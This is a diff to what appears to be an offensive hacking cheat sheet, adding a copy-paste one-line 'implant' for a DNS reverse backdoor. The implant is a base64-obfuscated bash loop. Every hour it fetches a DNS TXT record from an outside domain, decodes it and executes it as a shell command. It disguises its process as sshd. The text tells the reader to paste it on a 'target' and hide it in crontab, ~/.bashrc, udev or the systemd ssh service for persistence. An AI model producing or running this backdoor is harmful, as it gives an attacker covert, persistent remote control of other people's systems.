@@ -1875,7 +1875,7 @@ An elaborate DNS reverse backdoor (as a daemon and living-off-the-land):
 - Requests a DNS TXT record every 60 minutes (from b00m2.team-teso.net).
 - Base64-decodes the TXT record and executes the command on the target. (the test command creates /tmp/.b00m).
 
-1. Modify the following to your liking and then Cut & Paste it to generate the 1-line implant.
+1. Generate a 1-line implant:
 
 ```shell
 base64 -w0 >x.txt <<-'EOF'
@@ -1893,6 +1893,11 @@ done'|exec -a "$P" bash &) &>/dev/null
 EOF
 echo "===> Execute the following on the target:"$'\n\033[0;36m'"echo $(<x.txt)|base64 -d|bash"$'\033[0m'
 rm -f x.txt
+```
+
+Cut & paste the 1-line implant into the target:
+```
+echo RD1iMDBtMi50ZWFtLXRlc28ubmV0ClA9InNzaGQ6IC91c3Ivc2Jpbi9zc2hkIC1EIFtsaXN0ZW5lcl0gMCBvZiAxMC0xMDAgc3RhcnR1cHMiCk09L2Rldi9zaG0vLmNhY2hlJHtVSUR9ClsgLWYgJE0gXSYmZXhpdAp0b3VjaCAkTQooZWNobyAnc2xwKCl7IGxvY2FsIElGUztbIC1uICIke19zZmQ6LX0iIF18fGV4ZWMge19zZmR9PD4gPCg6KTtyZWFkIC10JDEgLXUkX3NmZHx8Ojt9CnNscCAxCndoaWxlIDo7IGRvCmRpZyArc2hvcnQgJyIkRCInIFRYVHx0ciAtZCBcIFwifGJhc2U2NCAtZHxiYXNoCnNscCAzNjAwCmRvbmUnfGV4ZWMgLWEgIiRQIiBiYXNoICYpICY+L2Rldi9udWxsCg==|base64 -d|bash
 ```
 
 2. Add the 1-line implant to any startup script on the target (use crontab, ~/.bashrc, [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=`). Here is a clever example for */usr/lib/systemd/system/ssh.service* (with some additional obfuscation):
